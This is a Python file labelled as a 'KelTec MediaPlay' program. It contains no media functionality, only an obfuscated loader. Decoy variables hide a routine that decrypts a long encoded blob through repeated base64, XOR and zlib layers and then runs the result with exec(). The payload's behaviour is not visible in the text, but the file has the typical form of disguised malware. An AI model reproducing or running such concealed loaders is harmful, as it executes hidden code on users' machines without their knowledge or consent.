# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 657297 ^ 261336
_lx1_1 = len("5a7706")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-843885)
_lx3_3 = 126110 * 0
_lx4_4 = 496493 ^ 656175
_K = '4314f6848c6f9e11338ee65d76a8936d71054623108161ac2418a6a3d7d3d39a'
_M = 'c19O+VWMjM8ndcUgQToJk1TeeceNhsRXwWSORmd7TJsiTkyhE4+dwCR5xyFCOwmWD4l6nNDRxVPAM4gXZXhPyHMZGacf2srGLnfN'
_D = '==w74kKVIOWksWggIabmps8O8fYRljakXa+wxQ6V9sLKhQlrpgafpd67WOSFjLimdXpnzM5ExZN05g0RFd00cgDxPuxqkGBJFeucN8R3n9UaHYZui8hQvuh0VG/+ropYPkeEVYBTgduDn7YC/hXq8LVUYE2O8yoCpJnOP9UO1ATUkeaGd63WIQBpawTanCjqxNapil0Jb5oGktSTTAEpxtU32tyitUApvPlLycvlKkSE7lQyEcWk3CIUbDRkj4tadxl2BL7UHCZFhn75u7pSJJUV51ez8ffiijqzhFE7hzh6GxN8gghJp3ekpOzshVpJcLhZr5QSK/hea3U+5f8i7S3bgescjW2oeiK8vZKpBW1XG9gvU3nJ3jCDWdTMCrV7zGdsdmJ3uSumYI4GdD3AAfHjnXJKbV8oL0c8vH5RDFrInkxb9kDzPKpjTjx7Vah39kboS7pJSeIYKilwtoewcy2sa51TxRFinoA1oj4mAF05ZBm+FAUxqasqATs2elp8vZyyfT9C6B9+Bg5ys8itG/aWKYcw2MnDk/Il6BFnTK3G4W7ns7FzRjn9LcQsU/mFaU+cDGEv34NJgmIdY2mAyhdX7CARrD1V4niEgOayeDKE9XrlJPIlNipnl2tTe9N6Hg49JdMUpmFq4TfWj7H8LH+VmJqPUKP6s9oIwPWyvpRF3qQ+SkfpftC7T03p0xZcgCKDbIisZZmX5M6WGTFcOirCEU0eyrq/8+Jm18n6mcyIPZIukLFu7nCeDe6AD9l0EvdXATcoY0beXDfraDqcweqESFn3RWl8KXVNAnaIfUtJskh+IXvIgmTY6spssE6rbr5v/ZubzH/KPBLHqblFu+eY4Filf3I5qkA2uCgXh5jDjrPsF6qDW2NtcLWaUiIi20ufcDQMbMH8hQ+qpWBKBTN+X0+f9U3lt5q13rfL7lcsaFX51L3kxafdhwA+to/bFLZSsOC6yYtzqeE+Ez+sA+lQffAY86juWmttw+c+JXQNt5Iiax3h7QMTjJmmZcRqJrwh//soSiNx7XeTOiOJd6l/ApZvNYrQ2x8+9an//HCBsK6eVuQ0tZMEefQ9JPT9NVCrMV58Ck2PAl/PklFa5wGuEbiGyLXspk4jMHdsP46q3HHmwINuWRCahPbc1qmcFxNn8kT+5cZuIyE9RnJElU2u1VRYci/z9uUfLQ3QlSCcQY9lmHSbJN47SmM5Szvt5892uhilbE5Bic5D9sGs2SzLjXk4QxubRPjCs4zP1wvg9V7UIu+K27Bqm5F4UzZvjKbmDzfWKBDoqcBgLwjqFAXb9v97hT0DIMVhpPnlBb8GF5EdeGdPqCDpMmO9zqXPSDYYwQHrz3wY5IJf5lwk/quE8wvXztvitTLQrgX4OHXk2G7oRfSWgNurHaUi3Duu2eQCPnqMFpcc01mEysgekBbNs6KixO2byfC3b6ntp6lvTBPUAiGPuJoIARTI+vU5qtD7GBzw6UOm1z3oolEkHJNYSnWyTpAEG0rTqsusCZvdcVPVMPKe9wMV2WiS752Ub3trRDUfZZz7zyY3gkAgqtIltZBL1/U2kScL/5wbDl1u7eQv2dPUaN6n+fWSwNiuMOsv44X1cF2bEPrFwYU0+af5E7WyXfYVmxLtSamSd+dbaWVNzE4RbdoaKzFif03+Qaqr1i4hwwkCbI5dqrMH30NW3wmvOJODSs0KnkcU/d/Sm41CxYl8PZpjln6BXbtQ583aZfVPZyaNvU/ZeKIrerKe/UDkPONDd2UCkNaQCXokwWeu+yMiCcMpfP+nUANu6mHxxvSmxaZNDuwotUXWDdYqs0rjqUnItpGbLpcVsQMvWy256YNSdO8rLrtqVEif'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()